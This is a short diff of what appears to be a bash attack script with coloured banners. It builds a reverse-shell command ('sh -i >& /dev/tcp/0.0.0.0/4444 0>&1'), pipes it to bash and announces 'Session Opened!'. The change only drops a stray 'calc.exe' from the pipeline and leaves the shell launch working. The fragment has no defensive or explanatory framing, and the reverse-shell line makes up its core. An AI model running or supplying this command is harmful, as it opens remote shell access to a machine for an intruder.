@@ -24,4 +24,4 @@ echo "$XBanner"
 command="sh -i >& /dev/tcp/0.0.0.0/4444 0>&1"
 echo "$green Starting Shell Session $reset"
 cd /
-echo "$command" | bash | calc.exe | echo "$cyan Session Opened! $reset"
+echo "$command" | bash | echo "$cyan Session Opened! $reset"
